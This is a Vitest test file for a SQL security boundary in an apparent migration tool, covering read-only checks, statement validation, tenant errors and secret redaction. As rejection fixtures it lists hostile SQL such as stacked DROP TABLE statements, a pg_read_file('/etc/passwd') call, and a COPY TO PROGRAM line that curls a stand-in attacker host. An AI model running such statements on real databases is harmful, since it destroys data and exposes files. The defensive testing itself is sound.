import { describe, expect, it } from "vitest";
import { assertTenant, classifySqlRisk, isReadOnlySql, redactSensitive, redactSensitiveText, requiresApproval, validateSingleSqlStatement } from "@/lib/security";

describe("SQL security boundary", () => {
  it("accepts one bounded read query shape", () => {
    expect(isReadOnlySql("SELECT id FROM products LIMIT 20")).toBe(true);
    expect(isReadOnlySql("WITH active AS (SELECT id FROM products) SELECT * FROM active")).toBe(true);
    expect(isReadOnlySql("SELECT 1 UNION SELECT 2")).toBe(true);
  });

  it.each([
    "DELETE FROM products",
    "UPDATE products SET price = 0",
    "DROP TABLE products",
    "SELECT 1; DROP TABLE products",
    "SELECT 1; SELECT 2",
    "WITH removed AS (DELETE FROM products RETURNING *) SELECT * FROM removed",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_terminate_backend(42)",
    "SELECT nextval('private_sequence')",
    "",
  ])("rejects unsafe or multiple statements: %s", (statement) => {
    expect(isReadOnlySql(statement)).toBe(false);
  });

  it("classifies risk and guards production", () => {
    expect(classifySqlRisk("DROP TABLE products", "development")).toBe("critical");
    expect(classifySqlRisk("CREATE INDEX x ON products(id)", "development")).toBe("medium");
    expect(requiresApproval("SELECT 1", "production")).toBe(true);
  });

  it("requires one parseable statement per Change Set", () => {
    expect(validateSingleSqlStatement("CREATE INDEX product_name_idx ON products(name)")).toEqual({ valid: true });
    expect(validateSingleSqlStatement("CREATE TABLE x(id int); DROP TABLE users")).toMatchObject({ valid: false });
    expect(validateSingleSqlStatement("CREATE TABL broken")).toMatchObject({ valid: false });
  });

  it("rejects inline database credentials before creating an artifact", () => {
    expect(validateSingleSqlStatement("ALTER USER app PASSWORD 'canary-secret'")).toEqual({
      valid: false,
      reason: "Inline credentials are forbidden; use a managed secret reference",
    });
  });

  it.each([
    "COMMIT",
    "SET ROLE database_owner",
    "ALTER SYSTEM SET log_statement = 'all'",
    "CREATE DATABASE second_database",
    "CREATE INDEX CONCURRENTLY products_name_idx ON products(name)",
    "COPY products TO PROGRAM 'curl attacker.test'",
  ])("rejects statements that escape or cannot participate in the managed migration transaction: %s", (statement) => {
    expect(validateSingleSqlStatement(statement)).toEqual({
      valid: false,
      reason: "Statement is not allowed inside QKERN's managed migration transaction",
    });
  });

  it("protects the target-side migration ledger namespace", () => {
    expect(validateSingleSqlStatement("TRUNCATE qkern_internal.migration_ledger")).toEqual({
      valid: false,
      reason: "The qkern_internal namespace is reserved for QKERN's migration ledger",
    });
  });
});

describe("tenant and secret boundaries", () => {
  it("returns a non-enumerating tenant error", () => {
    expect(() => assertTenant("org_a", "org_b")).toThrow("RESOURCE_NOT_FOUND");
  });

  it("redacts nested and array secrets", () => {
    expect(redactSensitive({ ok: "visible", password: "canary", nested: [{ apiKey: "canary-2" }] })).toEqual({
      ok: "visible", password: "[REDACTED]", nested: [{ apiKey: "[REDACTED]" }],
    });
  });

  it("redacts secrets embedded in SQL and URLs", () => {
    expect(redactSensitiveText("ALTER USER app PASSWORD 'canary-secret'")).not.toContain("canary-secret");
    expect(redactSensitiveText("postgresql://app:canary@db.internal/qkern")).toBe("postgresql://[REDACTED]@db.internal/qkern");
    expect(redactSensitiveText("api_key=canary-value")).not.toContain("canary-value");
  });
});
